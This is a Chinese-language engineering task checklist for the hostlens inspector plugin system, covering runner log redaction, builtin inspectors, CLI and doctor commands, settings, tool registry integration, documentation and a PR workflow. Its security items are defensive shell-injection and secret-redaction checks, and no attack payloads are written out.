  验收：单测覆盖 (a) 5 种 status 全部触发路径；(b) 非法参数 raise ValueError；(c) runner 自身访问 `manifest.nonexistent_attr` 触发 `AttributeError` **重新 raise** 不被吞；(d) `format_message` 处的 `KeyError` 触发 finding rule skip 整体 status=ok；(e) `ctx.target_registry._internal_dict["x"]`（runner 内部访问 registry 私有结构）触发 `KeyError` **重新 raise** 不被吞；(f) grep `src/hostlens/inspectors/runner.py` 必须**不含** `except Exception` / `except (AttributeError` / `except (KeyError`（除 format_message 的精确调用点处）
- [x] 8.7 **runner 日志脱敏**：runner 在 `inspector_started` / `inspector_finished` log 中**禁止**记录 `parameters` 完整字典 / 解析后 `output` 完整内容 / `secrets_env` 任何值；只记 `inspector.name` / `inspector.version` / `target.name` / `status` / `duration_seconds` / `findings_count` / `stdout_length` / `stderr_length`；验收：单测构造含 `password: literal-secret-12345` 的 parameters，跑一次 runner，断言 structlog 输出**不**含 `literal-secret-12345` 子串

## 9. Builtin Inspector

- [x] 9.1 写 `src/hostlens/inspectors/builtin/hello/echo.yaml`：按 spec §需求:内置 Inspector hello.echo... 完整字段；message 用 `"hello received: {raw}"`（引用 output.raw 而非不存在的 target_name）；验收：单测断言 (a) `load_manifest(path)` 成功；(b) `result = build_registry_from_search_paths([], settings=Settings()); result.registry.get("hello.echo")` 返回完整 manifest 且 `result.errors == []`；(c) end-to-end runner.run 在 LocalTarget 上跑出 `InspectorResult(status="ok", findings=[Finding(severity="info", message="hello received: hello\n", evidence={})])`
- [x] 9.2 写 `src/hostlens/inspectors/builtin/system/uptime.yaml`：按 spec §需求:内置 Inspector ... system.uptime... 完整字段；用 `raw_extract_regex` 提取 3 个负载值；findings 用 `float(load1) > 4.0` / `> 8.0`（DSL 已注册 float）；验收：单测断言 (a) loader 加载成功；(b) end-to-end 在 macOS 与 Linux LocalTarget 上跑通（CI 仅 Linux runner，但本地 macOS 验证后注释保留）；(c) findings 在 load=0.42 的低负载 fixture 上为空数组（两个阈值都没触发）

## 10. CLI: inspectors list / show

- [x] 10.1 实现 `hostlens.cli.inspectors.list_cmd`：`hostlens inspectors list [--tag <tag>] [--target-kind <kind>] [--json]`；
  - 用 `Settings()` + `result = build_registry_from_search_paths(settings.inspectors_search_paths, settings=settings)` 装配；`result.registry` 用于查询；`result.errors` 用于驱动 stderr 输出与 exit code
  - 默认输出：Rich Table 列 `name` / `version` / `description` / `tags` / `compatible_target_kinds`
  - `--tag` 过滤 `tag in manifest.tags`
  - `--target-kind` 过滤 `kind in manifest.targets`
  - `--json` 输出 `[InspectorSummary.model_dump()]`
  - **允许** root（read-only，不做 EUID==0 检查）
  - **加载错误处理**：装配 registry 时 catch `InspectorError` 累积到 errors 列表；list 输出 stdout 含正常加载的 inspector 表格（**不**含失败文件），但**必须** stderr 输出每个失败文件的 path + error kind + 简短 detail 一行，并以 **exit 1** 退出；**禁止** silent skip（防御纵深：攻击者放注入 manifest 后用户必须感知到）
  验收：单测用 CliRunner 覆盖 (a) 无过滤显示全部；(b) `--tag linux` 过滤；(c) `--target-kind ssh` 过滤；(d) `--json` schema 稳定（snapshot 测试 + JSON Schema 校验）；(e) `sudo` 不被拒（mock EUID=0 + 命令执行成功 exit 0）；(f) **用户目录含 1 个语法错 yaml + 2 个正常 manifest 时，stdout 含 2 行表格，stderr 含 1 行错误（path + `manifest_parse_error`），exit code = 1**（与 spec §场景:加载错误 exit 1 且 stderr 显示每个失败文件 一致）
- [x] 10.2 实现 `hostlens.cli.inspectors.show_cmd`：`hostlens inspectors show <name> [--json]`；
  - registry 同上
  - `registry.get(name)` 抛 `InspectorError(kind="inspector_not_found")` → exit 1 + stderr
  - 默认输出：Rich 渲染 manifest 关键字段；secrets 字段**只**显示名字列表；parameters 字段含 `default: "${ENV_VAR}"` 时显示占位符不展开
  - `--json` 输出 `manifest.model_dump()`（含 secrets 字段名列表）
  验收：单测覆盖 (a) 找到 inspector 默认输出；(b) `--json` schema 稳定；(c) `inspector_not_found` exit 1 + stderr；(d) **secrets 脱敏**：env `PGPASSWORD=literal-secret`，跑 `inspectors show postgres.bloat`（用 fixture manifest 含 `secrets: [PGPASSWORD]`），输出含 `PGPASSWORD` 但**不**含 `literal-secret`
- [x] 10.3 **CLI 错误输出语义**：所有 inspectors CLI 命令的错误信息走 stderr，数据走 stdout；验收：单测断言 `result.stderr_bytes` 与 `result.stdout_bytes` 分开

## 11. doctor 集成

- [x] 11.1 扩展 `hostlens.cli.doctor` 增加 `_check_inspectors(settings) -> dict` 函数：
  - 用 `result = build_registry_from_search_paths(settings.inspectors_search_paths, settings=settings)` 装配；`result.errors` 直接用作失败文件清单（**禁止** doctor 自己 try/except——errors 已由 `build_registry_from_search_paths` 收集；duplicate_inspector 仍会从此函数 raise，由 doctor 顶层 catch 转为 fatal 错误）
  - 遍历 `result.registry.list()` 成功加载的 manifest，扫 `manifest.secrets` 中每个 name 是否在 `os.environ`；缺失加入 missing_secrets
  - status 计算：`result.errors` 非空 → `fail`；errors 空 + missing_secrets 非空 → `warn`；都空 → `ok`
  - 返回 dict 含 `loaded`（=`len(result.registry.list())`）/ `errors`（=`result.errors`）/ `missing_secrets` / `status`
  验收：单测覆盖 3 种 status 触发路径 + (d) `duplicate_inspector` 由 `_check_inspectors` 抛出后 doctor 顶层捕获并标 `status="fail"`，stderr 显示冲突文件路径
- [x] 11.2 doctor `--json` 输出新增 `inspectors` key；M0 已有的 `python_version` / `anthropic_api_key` / `config_dir` section 必须保留；验收：snapshot 测试 + JSON Schema 校验同时覆盖 M0 字段 + M1 inspectors / targets 字段
- [x] 11.3 doctor 整体 exit code：任一 section status=fail → exit 1；warn 不影响 exit code；验收：单测覆盖 inspectors=fail + targets=ok 整体 exit 1
- [x] 11.4 **保持 M0 + M1.1/1.2 doctor 兼容性**：现有 `targets` section（M1.1 落地）必须保留；snapshot 测试覆盖

## 12. Settings 字段扩展

- [x] 12.1 **扩展 `hostlens.core.config.Settings`**：增加 `inspectors_search_paths: list[Path] = Field(default_factory=lambda: [Path("~/.config/hostlens/inspectors").expanduser()])`；支持 `HOSTLENS_INSPECTORS_SEARCH_PATHS` env override（`:` 分隔的路径列表 ↔ Unix PATH 风格）；用 pydantic-settings 的 `EnvSettingsSource` 或自定义 `field_validator` 实现 `:` 分隔字符串 → list[Path] 转换；空字符串视为空 list；验收：单测覆盖 (a) 默认路径；(b) 单个路径 env override；(c) 多路径 `:` 分隔 env override；(d) 空字符串 env override → 空 list
- [x] 12.2 **禁止**通过 settings 配置 builtin 路径；grep 仓库 `grep -rn "builtin_inspectors_path\|BUILTIN_INSPECTORS" src/hostlens/` 必须零结果（builtin 路径 hardcode 在 `build_registry_from_search_paths` 内）；验收：grep 0 结果作为 CI gate

## 13. Tool Registry 集成（消除 InspectorRegistry stub）

- [x] 13.1 修改 `src/hostlens/tools/base.py`：import 切换 `from hostlens.inspectors.registry import InspectorRegistry`；**完全删除**原 stub `InspectorRegistry` Protocol 定义 + 其 `list_summaries()` 方法签名；验收：(a) mypy --strict 0 错误；(b) `grep -rn "list_summaries" src/hostlens/tools/` 在 inspector 相关代码上**零结果**（仅 default_tools.py 内的 `ctx.inspector_registry.list_summaries()` 调用保留，**但**该调用现在指向真实 `InspectorRegistry.list_summaries()` 方法）；(c) `assert typing.get_type_hints(ToolContext)["inspector_registry"] is hostlens.inspectors.registry.InspectorRegistry`
- [x] 13.2 修改 `src/hostlens/tools/default_tools.py.run_inspector_handler`：
  - 从 `ctx.target_registry.get(args.target_name)` 拿 ExecutionTarget；未找到 raise `ToolError("target_not_found: <detail>")`（M1.3 范围 `ToolError` 无结构化 `kind` 字段；message-prefix `"target_not_found:"` 是 stable 契约，测试断言 `"target_not_found" in str(exc)`）
  - 从 `ctx.inspector_registry.get(args.inspector_name)` 拿 InspectorManifest；未找到 raise `ToolError("inspector_not_found: <detail>")`（同 message-prefix 风格）
  - 构造 `runner = InspectorRunner(ctx.target_registry, settings=ctx.config, logger=ctx.logger)`
  - `result = await runner.run(manifest, target, parameters=args.parameters, cancel=ctx.cancel, allow_privileged=False)`（**agent surface 强制 False**）
  - 投影 `InspectorResult → RunInspectorOutput`：`target_name=result.target_name`、`inspector_name=result.name`、`findings=[FindingSummary(severity=f.severity, message=f.message, evidence={k: str(v) for k, v in f.evidence.items()}) for f in result.findings]`
  - `result.status != "ok"` 时 `findings=[]` 即可（structlog 记录 status / error / missing）
  - **禁止**改 `RunInspectorOutput` schema（M2 已锁定，待 M3 add-report-data-model 扩展）
  验收：单测覆盖 (a) hello.echo 真实跑通返回 1 finding；(b) target 不可达 status=target_unreachable 但 findings=[] + 不抛异常；(c) target_not_found raise ToolError；(d) inspector_not_found raise ToolError；(e) `privilege="sudo"` manifest 在 agent surface dispatch 返回 findings=[]（runner 内部 requires_unmet）
- [x] 13.3 修改 `src/hostlens/tools/default_tools.py.list_inspectors_handler`：
  - 旧实现已经调 `ctx.inspector_registry.list_summaries()`；本任务保留调用形态
  - 但 `ctx.inspector_registry` 类型已切换到真实 `InspectorRegistry`（task 13.1）
  - 现有 `tag` / `target_kind` 过滤逻辑保持不变
  - 返回 `ListInspectorsOutput(inspectors=filtered)`
  验收：单测用真实 registry 含 hello.echo + system.uptime 覆盖 (a) 无过滤返回 2 条；(b) `tag="linux"` 过滤；(c) `target_kind="ssh"` 过滤；(d) 输出按 name 字典序
- [x] 13.4 修改 `tests/tools/` 下所有使用 stub `InspectorRegistry` 的 fixture，统一改用 `result = build_registry_from_search_paths([], settings=Settings())` 装配 + 用 `result.registry` 注入 `ToolContext(inspector_registry=result.registry, ...)`（含 builtin hello.echo + system.uptime）；**禁止**保留 stub fallback；**禁止**把函数返回值直接当 registry 用——必须用 `.registry` 解包；M2 现有 `tests/tools/test_list_inspectors.py` / `tests/tools/test_run_inspector.py` 测试用例 fixture 完全替换；snapshot 输出含真实数据
- [x] 13.5 验收 §需求:`ToolContext` 必须包含 M2 字段最小集 §场景:inspector_registry 是真实 InspectorRegistry 类型 —— `assert typing.get_type_hints(ToolContext)["inspector_registry"] is hostlens.inspectors.registry.InspectorRegistry`（用 `get_type_hints` 而不是 `__annotations__`，理由同 target_registry task 8.5）
- [x] 13.6 验收 §场景:run_inspector handler 通过 InspectorRunner dispatch 真实 inspector —— 行为测试 + 单元测试覆盖；用真实 LocalTarget + 真实 hello.echo manifest 验证 ToolRegistry dispatch 端到端

## 14. 文档与示例

- [x] 14.1 `docs/operations/inspectors.md`：manifest 字段速查（M1 子集） + shell 注入防御要点（loader 静态校验**五件套**：(1) parameter string/array(string-items) 必须含 pattern/enum；(2) collect.command 中 string 引用走 `| sh` filter，array(string-items) 走 `map('sh') | join`；(3) secrets 只能走 env var `$VAR` 引用，禁止 Jinja2 插值；(4) `requires_files` 路径限定严格 ASCII allowlist `^/[A-Za-z0-9._/-]+$` 且 runner 探测时 shlex.quote 双重保险；(5) `raw_extract_regex` 限长 200 字符 + 静态拒绝嵌套量词等 ReDoS 模式）+ builtin Inspector 列表（hello.echo + system.uptime）+ raw_extract_regex 用法（含可接受 vs 拒绝模式对照表）+ 4 种 parse format 选型指南 + `inspectors list/show` CLI 示例 + secrets 环境变量配置 best practice
- [x] 14.2 `docs/operations/inspector-authoring.md`：从零起一个新 Inspector 的 5 分钟教程：(1) 在 `~/.config/hostlens/inspectors/` 写 yaml；(2) `hostlens doctor` 检查加载错误；(3) `hostlens inspectors show <name>` 验证；(4) Python script 通过 ToolRegistry dispatch 试跑（下一提案 `add-report-data-model` 落地后改成 `hostlens inspect`）；(5) 常见 loader 错误诊断
- [x] 14.3 更新 `docs/ARCHITECTURE.md` §4：把 Inspector 章节"待办"状态改为"M1 落地（PR #<本提案 PR 号>）"；明确 M1 范围 = "manifest 加载 + 4 种 parse format（无 sql_result）+ Finding DSL（含 simpleeval 注入 float/int）+ Runner（5 种 InspectorStatus 闭集）"；M1 范围**不**含 hook.py / sampling_window / artifacts / sql_result
- [x] 14.4 `examples/m1-inspectors/README.md`：5 分钟 demo 路径（按 proposal.md Demo Path 9 步严格一致）；含 `examples/m1-inspectors/dispatch.py` 用 ~30 行展示通过 ToolRegistry dispatch run_inspector 的完整 boilerplate（含装配 ToolContext / 调用 dispatch / 打印 RunInspectorOutput）；含 `examples/m1-inspectors/bad-injection.yaml` fixture（demo 步骤 7 用，故意写 string parameter 缺 pattern 触发 loader raise）
- [x] 14.5 README "快速开始"小节增加 `hostlens inspectors list` + `hostlens inspectors show hello.echo` 一行示例

## 15. 验证与 demo path

- [x] 15.1 跑 `mypy --strict src/hostlens/inspectors/ src/hostlens/cli/inspectors.py src/hostlens/tools/base.py src/hostlens/tools/default_tools.py src/hostlens/cli/doctor.py src/hostlens/core/config.py src/hostlens/core/exceptions.py` 必须 0 错误
- [x] 15.2 跑 `ruff check src/ tests/` 必须 0 错误
- [x] 15.3 跑 `pytest tests/inspectors/ tests/cli/test_inspectors.py tests/cli/test_doctor.py tests/tools/test_list_inspectors.py tests/tools/test_run_inspector.py tests/core/test_exceptions.py tests/core/test_config.py -v` 必须全绿
- [x] 15.4 跑 proposal Demo Path 全部 9 步；记录每步输出到 `examples/m1-inspectors/`；步骤 6 的 dispatch.py 必须独立可跑（含必要的 sys.path 设置或假设 `pip install -e ".[dev]"` 后跑）；步骤 7 的注入 yaml 必须确实触发 `parameter_missing_charset_constraint` raise（不是其他错误）
- [x] 15.5 **shell 注入 payload 矩阵 CI gate**：`tests/inspectors/test_loader_injection.py` 必须含 ≥10 个真实注入 payload 的回归测试（task 4.6 已实现），CI 必须跑这个文件作为独立 gate；任何 manifest 字段静态校验放宽都必须先更新此测试矩阵

## 16. Git 工作流与归档准备（按 CLAUDE.md §5.1 + §5.3）

- [x] 16.1 从 `main` 切 feature branch `feat/add-inspector-plugin-system`：`git checkout main && git pull origin main && git checkout -b feat/add-inspector-plugin-system`
- [x] 16.2 完成所有上述任务后 commit 到 feature branch（**禁止**直接 push 到 main，main 已设 branch protection；按 CLAUDE.md §5.1 全部走 PR 流程）
- [x] 16.3 **commit 后、push 前**：跑 `/review-loop-codex` 对代码变更做对抗性 review（理由：本提案含 shell 注入静态校验 + simpleeval sandbox + 跨 spec MODIFIED 块——属于"安全相关 + 跨模块"必须走 review 的范畴；按 CLAUDE.md §5.3 判断标准）；结论 APPROVE/CLEAR 才进入 16.4
- [x] 16.4 push branch + 开 PR 到 main（描述含 spec 引用 `openspec/changes/add-inspector-plugin-system/` 与 proposal.md Demo Path 链接）
- [x] 16.5 等 CI 全绿 + 人类 review 通过后 squash merge：`\gh pr merge 15 --squash --delete-branch`（合并为 main commit `2741b94`）
- [x] 16.6 准备归档：跑 `openspec-cn validate add-inspector-plugin-system` 确认变更可归档；后续运行 `/opsx:archive` 推进到 `openspec/specs/{inspector-plugin-system}/spec.md` 并同步 `openspec/specs/tool-registry-capability-layer/spec.md` 的 2 个 MODIFIED 需求块（ToolContext 字段类型 + M2 首批 ToolSpec handler 契约）
